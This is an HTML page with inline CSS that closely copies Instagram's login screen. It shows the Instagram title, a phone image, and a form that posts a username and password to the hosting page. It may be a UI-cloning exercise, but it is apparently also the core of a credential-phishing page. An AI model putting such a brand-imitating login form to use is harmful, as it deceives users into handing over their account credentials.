<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #fafafa;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      max-width: 900px;
      width: 100%;
    }

    .phone-img {
      flex: 1;
      display: none;
    }

    .phone-img img {
      width: 100%;
    }

    .form-section {
      width: 100%;
      max-width: 350px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }

    .form-section h1 {
      font-family: 'Billabong', cursive;
      font-size: 3rem;
      margin-bottom: 30px;
    }

    .form-section input {
      width: 100%;
      padding: 10px;
      margin-bottom: 8px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }

    .form-section button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-top: 10px;
      cursor: pointer;
    }

    .divider {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .divider hr {
      flex: 1;
      border: none;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider span {
      margin: 0 15px;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #3897f0;
      text-decoration: none;
      font-weight: 500;
    }

    @media (min-width: 768px) {
      .phone-img {
        display: block;
        margin-right: 40px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-wrapper">
      <div class="phone-img">
        <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Phone">
      </div>
      <div class="form-section">
        <h1>Instagram</h1>
        <form method="POST">
          <input type="text" name="username" placeholder="Phone number, username, or email" required>
          <input type="password" name="password" placeholder="Password" required>
          <button type="submit">Log In</button>
        </form>

        <div class="divider">
          <hr>
          <span>OR</span>
          <hr>
        </div>

        <div>
          <a href="#" style="color:#385185; font-weight: 500; text-decoration: none; font-size: 14px;">
            Log in with Facebook
          </a>
        </div>

        <div style="margin-top: 12px;">
          <a href="#" style="color: #00376b; font-size: 12px; text-decoration: none;">Forgot password?</a>
        </div>

        <div class="signup">
          Don't have an account? <a href="#">Sign up</a>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
